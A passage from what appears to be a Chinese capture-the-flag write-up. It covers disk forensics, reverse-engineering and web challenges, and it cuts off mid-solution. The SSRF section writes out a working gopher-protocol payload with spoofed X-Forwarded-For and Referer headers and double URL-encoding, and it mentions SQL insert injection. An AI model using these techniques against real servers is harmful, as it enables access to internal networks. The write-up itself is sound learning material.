src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651310436251-0664eb2c-f6e3-41a4-9994-96defec0c4f7.png#clientId=u0fba9173-bf4b-4&amp;from=paste&amp;height=644&amp;id=u8a23cd12&amp;originHeight=805&amp;originWidth=1621&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=63981&amp;status=done&amp;style=none&amp;taskId=u27ad68af-b714-4c8f-bfb7-5b9de816160&amp;title=&amp;width=1296.8" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651310460503-beaf6e0d-6337-4394-8488-6d8775979b52.png#clientId=u0fba9173-bf4b-4&amp;from=paste&amp;height=229&amp;id=u79cfff55&amp;originHeight=286&amp;originWidth=970&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=12940&amp;status=done&amp;style=none&amp;taskId=ued67d306-52f7-4aa3-8af2-c9d7ecce83c&amp;title=&amp;width=776" alt="image.png"><br><a name="iOABR"></a></p><h3 id="2-不要相信你看到的"><a href="#2-不要相信你看到的" class="headerlink" title="2.不要相信你看到的"></a>2.不要相信你看到的</h3><p><a name="DY2Wy"></a></p><h3 id="3-所见非所见"><a href="#3-所见非所见" class="headerlink" title="3.所见非所见"></a>3.所见非所见</h3><p><a name="XAgIp"></a></p><h3 id="4-玩坏的winxp"><a href="#4-玩坏的winxp" class="headerlink" title="4.玩坏的winxp"></a>4.玩坏的winxp</h3><p>文件解压，是 vmdk 虚拟磁盘，挂载到 <strong>DiskGenius</strong> <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651145141395-ef4fa716-0edf-4149-b9a1-9cb22fe25a05.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=255&amp;id=u5d762a2c&amp;originHeight=859&amp;originWidth=1488&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=124910&amp;status=done&amp;style=none&amp;taskId=u0a741e26-ca53-4c69-8c59-00f571190fa&amp;title=&amp;width=441.8000183105469" alt="image.png"><br />查看桌面 存了10个T的学习资料，厉害~结果是 meiren 照片！<br />统统导出来！！！<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651145034958-b115b342-0e75-46c5-a12f-c910aefafd81.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=86&amp;id=u3191c979&amp;originHeight=243&amp;originWidth=1045&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=88303&amp;status=done&amp;style=none&amp;taskId=u69d56207-e7ab-4a6f-879e-a561ecd85b1&amp;title=&amp;width=370.8000183105469" alt="image.png"><br />发现最后一个有点问题啊，为什么这么大…..<br />分离看看，藏了个 压缩包…<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651145329961-03904dd5-4a15-4474-9592-5d8e1c8add3e.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=207&amp;id=ub297b5fa&amp;originHeight=481&amp;originWidth=1055&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=116913&amp;status=done&amp;style=none&amp;taskId=u41d83fc1-f93f-4ba8-8282-5bb36417006&amp;title=&amp;width=454" alt="image.png"><br />emm 挺好的<del>~<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651145378840-ea420554-c5c9-47a9-86a4-fedac6b6bcaa.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=138&amp;id=u62cc5e2d&amp;originHeight=397&amp;originWidth=949&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=58767&amp;status=done&amp;style=none&amp;taskId=ue908f3fc-92fb-43fc-8ac0-ed04050679d&amp;title=&amp;width=330" alt="image.png"><br />010 editor 打开发现还藏着  zip !!! 继续 binwalk<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651145446820-a5e95235-25e9-474d-8630-b59043fcee5b.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=159&amp;id=u1a305e38&amp;originHeight=372&amp;originWidth=1076&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=79043&amp;status=done&amp;style=none&amp;taskId=u1984c7c5-8dbd-4aa2-a1ef-5afe500d48f&amp;title=&amp;width=461" alt="image.png"><br />结果有秘密。。。看到了压缩包注释信息，看到了 <strong>围脖 </strong>，想到了 <strong>Firefox </strong><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651145059869-e25a7f59-6318-43ce-8f01-c3f205d846f6.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=147&amp;id=u37868066&amp;originHeight=385&amp;originWidth=1269&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=55831&amp;status=done&amp;style=none&amp;taskId=u170dc8bb-f489-4962-a4c3-7913d2aed18&amp;title=&amp;width=484" alt="image.png"><br />发现很多 sqlite 文件，打开看看<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651145259044-238602d2-1c51-4411-a54d-b3463a1fb242.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=284&amp;id=u6e6dac74&amp;originHeight=766&amp;originWidth=1494&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=235709&amp;status=done&amp;style=none&amp;taskId=ucf7fb446-00db-4bb7-921b-84de4522b3d&amp;title=&amp;width=553" alt="image.png"><br />发现了 Firefox 浏览器记录信息包含一个QQ号<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651145022066-28b018ff-f08f-4cc7-9e34-60301fcaea19.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=263&amp;id=u62cd1c32&amp;originHeight=707&amp;originWidth=1719&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=152669&amp;status=done&amp;style=none&amp;taskId=udc8343af-fdb1-4f38-b292-b34cbc59b7d&amp;title=&amp;width=639" alt="image.png"><br />加不上好友，那就看看空间吧</del><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651144882800-775456fb-ef40-4dcc-860a-c2ede00c985e.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=266&amp;id=u2652bcd6&amp;originHeight=590&amp;originWidth=1422&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=165007&amp;status=done&amp;style=none&amp;taskId=u8d0cf844-4262-43d8-89d4-bef50c850fb&amp;title=&amp;width=641" alt="image.png"><br />总忘记密码，看来是存在哪里了….<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651144777847-8b00367d-2f7d-48df-bf46-d0b0b9da1aec.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=292&amp;id=ub600d605&amp;originHeight=908&amp;originWidth=1802&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=173416&amp;status=done&amp;style=none&amp;taskId=u5e94f4b9-54f3-4d41-b75a-e756cbc34d1&amp;title=&amp;width=580" alt="image.png"><br />发现 md5 密文<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651144905636-2a475792-ffcd-4230-ba0d-df593b6c5ba3.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=219&amp;id=u79987069&amp;originHeight=386&amp;originWidth=1003&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=14674&amp;status=done&amp;style=none&amp;taskId=uf510e14f-fa78-4020-8b48-06f06e3d04d&amp;title=&amp;width=568" alt="image.png"><br />结束！！<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651145081402-699cb87d-c767-4d65-b20f-1a42ae0330dc.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=166&amp;id=u6b586567&amp;originHeight=440&amp;originWidth=1028&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=41884&amp;status=done&amp;style=none&amp;taskId=u1ae141e5-a401-4168-8da2-950c0a3d943&amp;title=&amp;width=386.8000183105469" alt="image.png"><br><a href=""><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="20220428_185510.mp4 (71.56MB)"></a><a name="H5bTW"></a></p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><p><a name="QmDeH"></a></p><h3 id="1-ez-algorithm"><a href="#1-ez-algorithm" class="headerlink" title="1.ez_algorithm"></a>1.ez_algorithm</h3><p><a name="ilFqy"></a></p><h3 id="2-freestyle"><a href="#2-freestyle" class="headerlink" title="2.freestyle"></a>2.freestyle</h3><p>010 editor 打开 文件开头为 elf ，那就运行一下<br />ida 打开查看主要函数，发现调用了两个函数 fun1 fun2 <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650878322038-003b7088-a528-43ab-8a74-402dc5048b66.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=158&amp;id=u7f93e36a&amp;originHeight=233&amp;originWidth=633&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=30428&amp;status=done&amp;style=none&amp;taskId=u5e385a78-8460-477b-93e6-2665e5ab4fd&amp;title=&amp;width=429.3999938964844" alt="image.png"><br />继续跟进函数<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650878356472-07569300-a422-4832-b071-5309ff733075.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=184&amp;id=uadd94a6d&amp;originHeight=268&amp;originWidth=514&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=43470&amp;status=done&amp;style=none&amp;taskId=ub4535d76-ca2c-47f3-ae82-dec4e9ef81e&amp;title=&amp;width=353.20001220703125" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650878368098-39f2acbb-2a98-4f87-bebf-b467b2df55e7.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=181&amp;id=ue5e4c7d0&amp;originHeight=308&amp;originWidth=628&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=53792&amp;status=done&amp;style=none&amp;taskId=ueb14d3d2-bbd5-4a68-8d59-d14b03e6727&amp;title=&amp;width=369.3999938964844" alt="image.png"><br />不愧是数学题~计算一下求MD5就可以了<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650878386542-cb4d4015-b247-4777-86f5-ac7b333ba9a7.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=218&amp;id=ub3014309&amp;originHeight=404&amp;originWidth=570&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=143712&amp;status=done&amp;style=none&amp;taskId=u2abb37ec-6cea-4b93-b317-1b1788bcade&amp;title=&amp;width=308" alt="image.png"><br><a name="Bn0Ux"></a></p><h3 id="3-Re-function"><a href="#3-Re-function" class="headerlink" title="3.Re_function"></a>3.Re_function</h3><p><a name="oCQiL"></a></p><h3 id="4-定时启动"><a href="#4-定时启动" class="headerlink" title="4.定时启动"></a>4.定时启动</h3><p>卡时间卡了很久，唉~~~<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650878039100-17ab4795-030b-416b-b9b4-3a3decb87d01.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=200&amp;id=ube404681&amp;originHeight=321&amp;originWidth=828&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=37990&amp;status=done&amp;style=none&amp;taskId=ub92ae2ba-df42-4297-aeac-d758a4dce87&amp;title=&amp;width=516.4000244140625" alt="86ff2977ae25b2464161db7155698f8.png"></p><p><a name="vJr5Y"></a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p><a name="YqPlc"></a></p><h3 id="signin-ssrf"><a href="#signin-ssrf" class="headerlink" title="signin(ssrf)"></a>signin(ssrf)</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650952452185-3cdef347-68c1-4cb4-b78f-7c21ddc89eba.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=143&amp;id=ufc47582c&amp;originHeight=329&amp;originWidth=1437&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=51673&amp;status=done&amp;style=none&amp;taskId=ud065e23c-7007-443e-9455-f18770872c5&amp;title=&amp;width=625.2000122070312" alt="image.png"></p><ol><li>file:// 协议</li><li>http(s):// 协议</li><li>dict:协议</li><li>gopher 协议</li></ol><p>伪协议读取文件 file<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650952626879-b7748172-7ee9-4caa-aaa9-c038161ff1ba.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=239&amp;id=u96b56523&amp;originHeight=603&amp;originWidth=1420&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=163026&amp;status=done&amp;style=none&amp;taskId=u2e115fcf-1dac-4d5a-85ad-d2a5715f0dd&amp;title=&amp;width=563.2000122070312" alt="image.png"><br />发现内网网段，估计是利用 gopher 协议了…<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650952789455-92ddbaaf-b67c-4804-be00-2fb6a3428f61.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=158&amp;id=u591c0d6c&amp;originHeight=386&amp;originWidth=1479&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=78062&amp;status=done&amp;style=none&amp;taskId=u618d63dd-b6b9-4d31-bc72-c7195c245a5&amp;title=&amp;width=604.2000122070312" alt="image.png"><br />发现很多内网主机，fuzz 吧<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650952859005-62b1d5bf-74b4-4c38-ae31-7c0699f7eec7.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=213&amp;id=ueb9d5875&amp;originHeight=709&amp;originWidth=1516&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=215294&amp;status=done&amp;style=none&amp;taskId=uca067315-c7b6-4bc2-a118-4fa51544fc8&amp;title=&amp;width=455.20001220703125" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650952959483-5bd77c4e-38a5-4651-8738-d4b4b651e32c.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=146&amp;id=u611e0ba8&amp;originHeight=489&amp;originWidth=1651&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=97370&amp;status=done&amp;style=none&amp;taskId=u5fc2eeae-e1f2-4a82-80f3-fb7c94a8204&amp;title=&amp;width=493.20001220703125" alt="image.png"><br />爆破出来 172.73.23.100 这个主机<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650953056439-0f07a86b-0e8a-49a2-a266-d6164c557bbf.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=299&amp;id=ufcc64e8f&amp;originHeight=691&amp;originWidth=1196&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=71762&amp;status=done&amp;style=none&amp;taskId=u5d98aa7e-6169-405f-9e9d-3c63e307a7c&amp;title=&amp;width=518.2000122070312" alt="image.png"><br />根据提示 传入 a<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650953118970-e1cd7749-3a51-4add-98bd-1f369f886b30.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=209&amp;id=u9cfdc6b6&amp;originHeight=631&amp;originWidth=1527&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=53615&amp;status=done&amp;style=none&amp;taskId=uc6e309dc-61db-4811-ba84-3ed8fad63a2&amp;title=&amp;width=506.20001220703125" alt="image.png"><br><a name="DtsCO"></a></p><h4 id="gopher-协议"><a href="#gopher-协议" class="headerlink" title="gopher 协议"></a>gopher 协议</h4><p><strong>格式：url:gopher://<host>:<port>/<gopher-path>_TCP数据流（GET/POST）</strong><br />如果是 post 请求，回车需要使用 <strong>%0d%0a </strong>参数和参数之间也需要 URL编码</p><p><strong>payload 需要进行 url-encode 两次</strong><br /><strong>需要全选构造的 payload （因为是 post）</strong><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650959467734-1edae897-e93e-4796-a211-ee2e281bfec8.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=92&amp;id=uf28c490a&amp;originHeight=142&amp;originWidth=852&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=17370&amp;status=done&amp;style=none&amp;taskId=uf98a8489-a71a-4cad-b0aa-1ad187433c0&amp;title=&amp;width=549.6000366210938" alt="image.png"><br />payload：</p><ol><li>构造 post 请求 的数据包</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?a=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.73.23.100</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">b</span><span class="operator">=</span><span class="number">2</span></span></span><br></pre></td></tr></table></figure><ol><li>进行 url-encode 两次</li><li><p>拼接到 url 后面 </p><p><a href="http://124.222.24.150:8091/?url=gopher://172.73.23.100:80/_"><strong>http://124.222.24.150:8091/?url=gopher://172.73.23.100:80/_</strong></a><strong> + url_encode_data(GET/POST)</strong><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650955262814-4ad3897c-6244-4ce1-95b2-2d23ee9e0296.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=251&amp;id=ua1964cfd&amp;originHeight=731&amp;originWidth=1495&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=88249&amp;status=done&amp;style=none&amp;taskId=uca3d6d32-cfe9-4062-ac3d-2f13461107a&amp;title=&amp;width=514" alt="image.png"><br />POST 好像少了点东西，加入 <strong>X-Forwarded-For:127.0.0.1</strong></p></li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?a=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.73.23.100</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">b</span><span class="operator">=</span><span class="number">2</span></span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650955931512-2f97f7f9-0912-4da7-ab01-e5e7391829fc.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=263&amp;id=u9e6bc888&amp;originHeight=743&amp;originWidth=1509&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=90428&amp;status=done&amp;style=none&amp;taskId=u9c703776-45a1-4422-93c3-7e891988a80&amp;title=&amp;width=534.2000122070312" alt="image.png"><br />continue….  join <strong>Referer:bolean.club</strong><br /><strong>referer 是代表 请求是从 这个网址过来的  bolean.club</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?a=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.73.23.100</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>bolean.club</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">b</span><span class="operator">=</span><span class="number">2</span></span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650955977521-3f337892-4504-47cb-9db8-d78589941264.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=260&amp;id=ucf91f935&amp;originHeight=747&amp;originWidth=1509&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=100167&amp;status=done&amp;style=none&amp;taskId=ue6e3fabd-6307-4c3f-8ba8-68865ee299d&amp;title=&amp;width=526.2000122070312" alt="image.png"><br />finally_payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.222.24.150:8091/?url=gopher://172.73.23.100:80/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%33%66%25%36%31%25%33%64%25%33%31%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%33%25%32%65%25%33%32%25%33%33%25%32%65%25%33%31%25%33%30%25%33%30%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%35%25%30%64%25%30%61%25%35%35%25%37%33%25%36%35%25%37%32%25%32%64%25%34%31%25%36%37%25%36%35%25%36%65%25%37%34%25%33%61%25%32%30%25%34%64%25%36%66%25%37%61%25%36%39%25%36%63%25%36%63%25%36%31%25%32%66%25%33%35%25%32%65%25%33%30%25%32%30%25%32%38%25%35%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%30%25%34%65%25%35%34%25%32%30%25%33%31%25%33%30%25%32%65%25%33%30%25%33%62%25%32%30%25%35%37%25%36%39%25%36%65%25%33%36%25%33%34%25%33%62%25%32%30%25%37%38%25%33%36%25%33%34%25%33%62%25%32%30%25%37%32%25%37%36%25%33%61%25%33%39%25%33%39%25%32%65%25%33%30%25%32%39%25%32%30%25%34%37%25%36%35%25%36%33%25%36%62%25%36%66%25%32%66%25%33%32%25%33%30%25%33%31%25%33%30%25%33%30%25%33%31%25%33%30%25%33%31%25%32%30%25%34%36%25%36%39%25%37%32%25%36%35%25%36%36%25%36%66%25%37%38%25%32%66%25%33%39%25%33%39%25%32%65%25%33%30%25%30%64%25%30%61%25%35%38%25%32%64%25%34%36%25%36%66%25%37%32%25%37%37%25%36%31%25%37%32%25%36%34%25%36%35%25%36%34%25%32%64%25%34%36%25%36%66%25%37%32%25%33%61%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%33%61%25%32%30%25%37%34%25%36%35%25%37%38%25%37%34%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%38%25%37%34%25%36%64%25%36%63%25%32%62%25%37%38%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%64%25%36%63%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%39%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%36%31%25%37%36%25%36%39%25%36%36%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%37%37%25%36%35%25%36%32%25%37%30%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%36%31%25%37%30%25%36%65%25%36%37%25%32%63%25%32%61%25%32%66%25%32%61%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%38%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%33%25%36%39%25%36%37%25%36%65%25%36%35%25%36%34%25%32%64%25%36%35%25%37%38%25%36%33%25%36%38%25%36%31%25%36%65%25%36%37%25%36%35%25%33%62%25%37%36%25%33%64%25%36%32%25%33%33%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%39%25%30%64%25%30%61%25%35%32%25%36%35%25%36%36%25%36%35%25%37%32%25%36%35%25%37%32%25%33%61%25%32%30%25%36%32%25%36%66%25%36%63%25%36%35%25%36%31%25%36%65%25%32%65%25%36%33%25%36%63%25%37%35%25%36%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%36%65%25%36%35%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%33%25%36%63%25%36%66%25%37%33%25%36%35%25%30%64%25%30%61%25%30%64%25%30%61%25%36%32%25%33%64%25%33%32%25%30%64%25%30%61</span><br></pre></td></tr></table></figure><p><a href=""><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="20220428_110255.mp4 (48.88MB)"></a><a name="rTHb2"></a></p><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p><strong>这里文件的 hint 为  SQL注入 永远的神~</strong><br />先传一个 phpinfo 试试（明知道不可以…）<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650961557406-d402e842-5bb3-47ab-bf16-625408b3d8bd.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=259&amp;id=u1bfe024d&amp;originHeight=720&amp;originWidth=1618&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=109824&amp;status=done&amp;style=none&amp;taskId=ueb6e866f-f2d7-411a-b5e2-b1e954b3eeb&amp;title=&amp;width=582" alt="image.png"><br />那就改 context-type <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650961586194-176cf5b3-348c-44cd-8b12-9938861a562a.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=120&amp;id=ue2127f3d&amp;originHeight=221&amp;originWidth=1061&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=24053&amp;status=done&amp;style=none&amp;taskId=u2642a527-82a2-45bf-a867-9e3fe93340a&amp;title=&amp;width=577" alt="image.png"><br />想到了 hint <strong>SQL注入</strong>，加了单引号，<strong>报错注入</strong>！！！！这里是 insert 注入<br /><img 